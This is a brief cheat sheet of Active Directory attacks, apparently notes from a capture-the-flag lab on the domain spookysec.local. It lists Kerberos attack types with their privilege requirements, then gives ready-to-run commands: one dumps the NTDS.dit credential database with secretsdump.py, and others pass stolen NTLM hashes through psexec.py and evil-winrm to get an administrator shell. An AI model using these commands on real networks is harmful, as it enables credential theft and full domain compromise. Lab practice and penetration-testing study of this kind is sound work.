
## Attacks Privilege requirements

- **Kerbrute Enumeration** - No domain access required 
- **Pass the Ticket** - Access as a user to the domain required
- **Kerberoasting** - Access as any user required
- **AS-REP Roasting** - Access as any user required
- **Golden Ticket** - Full domain compromise (domain admin) required 
- **Silver Ticket** - Service hash required 
- **Skeleton Key** - Full domain compromise (domain admin) required


## Dump NTDS.dit database
**Requirements**
- Admin user and password
```bash
secretsdump.py -just-dc backup@spookysec.local
```

## Pass the hash
**PSExec**
```bash
psexec.py -hashes PUT_THE:HASH_HERE administrator@spookysec.local
get cmd
```
**Evil-WinRM**

```bash
evil-winrm -u administrator -H PUT_THE_HASH_HERE -i spookysec.local
```
- /!\\ This only requires the second part of the NTLM hash